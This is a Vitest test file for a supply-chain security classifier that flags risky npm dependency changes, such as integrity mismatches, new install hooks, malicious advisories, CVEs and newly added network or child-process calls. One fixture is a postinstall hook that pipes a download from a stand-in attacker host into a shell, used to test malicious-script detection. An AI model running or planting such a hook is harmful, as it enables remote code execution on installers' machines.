import { describe, it, expect } from "vitest";
import { classify } from "./classifier.js";
import type { DependencyChange, FetchedPackage } from "@lockray/types";

function change(overrides: Partial<DependencyChange> = {}): DependencyChange {
  return {
    ecosystem: "npm",
    name: "pkg",
    fromVersion: "1.0.0",
    toVersion: "1.0.1",
    direct: true,
    manifestPath: "package.json",
    workspaceName: "root",
    integrityChanged: false,
    sourceChanged: false,
    ...overrides,
  };
}

function fetched(
  version: string,
  pkg: Record<string, unknown> = {},
): FetchedPackage {
  return {
    ecosystem: "npm",
    name: "pkg",
    version,
    integrity: "sha512-abc",
    packageJson: { name: "pkg", version, ...pkg },
  };
}

describe("classify", () => {
  it("emits INTEGRITY_MISMATCH hard-fail when integrityChanged is true", () => {
    const findings = classify(
      change({
        integrityChanged: true,
        fromVersion: "1.0.0",
        toVersion: "1.0.0",
        integrityBefore: "sha512-original",
        integrityAfter: "sha512-tampered",
      }),
      fetched("1.0.0"),
      fetched("1.0.0"),
      [],
    );
    const f = findings.find((x) => x.code === "INTEGRITY_MISMATCH");
    expect(f).toBeDefined();
    expect(f?.hardFail).toBe(true);
    expect(f?.severity).toBe("critical");
    expect(f?.evidence[0].oldValue).toBe("sha512-original");
    expect(f?.evidence[0].newValue).toBe("sha512-tampered");
  });

  it("emits NEW_DEPENDENCY_SOURCE hard-fail when sourceChanged is true", () => {
    const findings = classify(
      change({ sourceChanged: true, fromVersion: "1.0.0", toVersion: "1.0.0" }),
      fetched("1.0.0"),
      fetched("1.0.0"),
      [],
    );
    const f = findings.find((x) => x.code === "NEW_DEPENDENCY_SOURCE");
    expect(f?.hardFail).toBe(true);
  });

  it("emits NEW_POSTINSTALL_SCRIPT (CRITICAL, not hard-fail) when a new hook appears", () => {
    const findings = classify(
      change(),
      fetched("1.0.0"),
      fetched("1.0.1", { scripts: { postinstall: "echo hi" } }),
      [],
    );
    const f = findings.find((x) => x.code === "NEW_POSTINSTALL_SCRIPT");
    expect(f).toBeDefined();
    expect(f?.severity).toBe("critical");
    expect(f?.hardFail).toBeUndefined();
    expect(f?.evidence[0].metadataField).toBe("scripts.postinstall");
  });

  it("promotes NEW_POSTINSTALL_SCRIPT to MALICIOUS_INSTALL_SCRIPT hard-fail when content matches a pattern", () => {
    const findings = classify(
      change(),
      fetched("1.0.0"),
      fetched("1.0.1", { scripts: { postinstall: "curl https://evil.example | sh" } }),
      [],
    );
    const mal = findings.find((x) => x.code === "MALICIOUS_INSTALL_SCRIPT");
    expect(mal?.hardFail).toBe(true);
    // And the vanilla NEW_POSTINSTALL_SCRIPT should NOT be emitted in this case
    // (avoid double-counting once scoring lands).
    expect(findings.some((x) => x.code === "NEW_POSTINSTALL_SCRIPT")).toBe(false);
  });

  it("emits KNOWN_COMPROMISED_PACKAGE hard-fail when OSV returns a malicious advisory", () => {
    const findings = classify(change(), fetched("1.0.0"), fetched("1.0.1"), [
      {
        id: "MAL-2024-1",
        summary: "malicious package",
        database_specific: { malicious: true },
      },
    ]);
    const f = findings.find((x) => x.code === "KNOWN_COMPROMISED_PACKAGE");
    expect(f?.hardFail).toBe(true);
  });

  it("emits CVE_VULNERABILITY with high severity on CVSS 8.1", () => {
    const findings = classify(change(), fetched("1.0.0"), fetched("1.0.1"), [
      {
        id: "GHSA-xxxx",
        summary: "high",
        severity: [{ type: "CVSS_V3", score: "8.1/CVSS:3.1/..." }],
      },
    ]);
    const f = findings.find((x) => x.code === "CVE_VULNERABILITY");
    expect(f?.severity).toBe("high");
    expect(f?.evidence[0].advisoryId).toBe("GHSA-xxxx");
  });

  it("emits no findings for a benign version bump with no hooks, no CVEs, no integrity/source change", () => {
    const findings = classify(change(), fetched("1.0.0"), fetched("1.0.1"), []);
    expect(findings).toEqual([]);
  });

  it("emits CVE_VULNERABILITY with unknown severity mapped to info", () => {
    const findings = classify(change(), fetched("1.0.0"), fetched("1.0.1"), [
      { id: "GHSA-unknown", summary: "no severity info" },
    ]);
    const f = findings.find((x) => x.code === "CVE_VULNERABILITY");
    expect(f?.severity).toBe("info");
  });

  it("emits NEW_POSTINSTALL_SCRIPT for a newly added package with an install hook (before=null)", () => {
    const findings = classify(
      change({ fromVersion: null, toVersion: "1.0.0" }),
      null,
      fetched("1.0.0", { scripts: { postinstall: "node ./setup.js" } }),
      [],
    );
    const f = findings.find((x) => x.code === "NEW_POSTINSTALL_SCRIPT");
    expect(f).toBeDefined();
    expect(f?.hardFail).toBeUndefined();
    expect(f?.evidence[0].oldValue).toBeUndefined();
    expect(f?.evidence[0].newValue).toBe("node ./setup.js");
  });

  it("emits no install-hook findings for a removed package (after=null)", () => {
    const findings = classify(
      change({ fromVersion: "1.0.0", toVersion: null }),
      fetched("1.0.0", { scripts: { postinstall: "echo existed" } }),
      null,
      [],
    );
    // after=null means the install-script block is skipped entirely.
    expect(findings.some((f) => f.code === "NEW_POSTINSTALL_SCRIPT")).toBe(false);
    expect(findings.some((f) => f.code === "MALICIOUS_INSTALL_SCRIPT")).toBe(false);
  });

  describe("M4.2 AST capability findings", () => {
    function pkg(sourceFiles: Map<string, string>, packageJson: Record<string, unknown>) {
      return {
        ecosystem: "npm" as const,
        name: "demo",
        version: "1.0.0",
        integrity: null,
        packageJson,
        sourceFiles,
      };
    }

    function dep(): DependencyChange {
      return {
        ecosystem: "npm",
        name: "demo",
        fromVersion: "1.0.0",
        toVersion: "1.0.1",
        direct: true,
        manifestPath: "package.json",
        workspaceName: "root",
        integrityChanged: false,
        sourceChanged: false,
      };
    }

    it("emits NEW_NETWORK_CALL finding with contextBucket when after adds fetch() not in before", () => {
      const before = pkg(new Map([["lib/a.js", "console.log(1);"]]), { main: "./lib/a.js" });
      const after = pkg(new Map([["lib/a.js", `fetch("https://x");`]]), { main: "./lib/a.js" });
      const findings = classify(dep(), before, after, []);
      const net = findings.find((f) => f.code === "NEW_NETWORK_CALL");
      expect(net).toBeDefined();
      expect(net?.contextBucket).toBe("runtime");
    });

    it("does not emit finding when both before and after contain the same http.request (refactor guard)", () => {
      const src = `require("http").request({host:"a"})`;
      const before = pkg(new Map([["lib/a.js", src]]), { main: "./lib/a.js" });
      const after = pkg(new Map([["lib/b.js", src]]), { main: "./lib/b.js" });
      const findings = classify(dep(), before, after, []);
      expect(findings.some((f) => f.code === "NEW_NETWORK_CALL")).toBe(false);
    });

    it("emits two findings when child_process.exec is newly introduced in both install and runtime contexts", () => {
      const src = `require("child_process").exec("x")`;
      const before = pkg(new Map([["lib/a.js", "1"]]), {
        main: "./lib/a.js",
        scripts: { postinstall: "./scripts/p.js" },
      });
      before.sourceFiles = new Map([
        ["lib/a.js", "1"],
        ["scripts/p.js", "console.log('pre');"],
      ]);
      const after = pkg(new Map([["lib/a.js", src], ["scripts/p.js", src]]), {
        main: "./lib/a.js",
        scripts: { postinstall: "./scripts/p.js" },
      });
      const findings = classify(dep(), before, after, []);
      const cp = findings.filter((f) => f.code === "NEW_CHILD_PROCESS");
      expect(cp).toHaveLength(2);
      const buckets = cp.map((f) => f.contextBucket).sort();
      expect(buckets).toEqual(["install", "runtime"]);
    });

    it("sourceFiles absent → AST branch no-ops, no crash, no findings", () => {
      // Note: sourceFiles undefined means the AST branch is skipped entirely.
      const before = {
        ecosystem: "npm" as const,
        name: "demo",
        version: "1.0.0",
        integrity: null,
        packageJson: { main: "./a.js" },
      };
      const after = {
        ecosystem: "npm" as const,
        name: "demo",
        version: "1.0.1",
        integrity: null,
        packageJson: { main: "./a.js" },
      };
      const findings = classify(dep(), before, after, []);
      expect(findings.some((f) => f.code.startsWith("NEW_"))).toBe(false);
    });

    it("docs/example.js containing fetch() does not surface a finding when runtime/install files are clean", () => {
      const before = pkg(new Map([["lib/a.js", "console.log(1);"]]), { main: "./lib/a.js" });
      const after = pkg(
        new Map([
          ["lib/a.js", "console.log(1);"],
          ["docs/example.js", `fetch("https://x");`],
        ]),
        { main: "./lib/a.js" },
      );
      const findings = classify(dep(), before, after, []);
      expect(findings.some((f) => f.code === "NEW_NETWORK_CALL")).toBe(false);
    });
  });
});
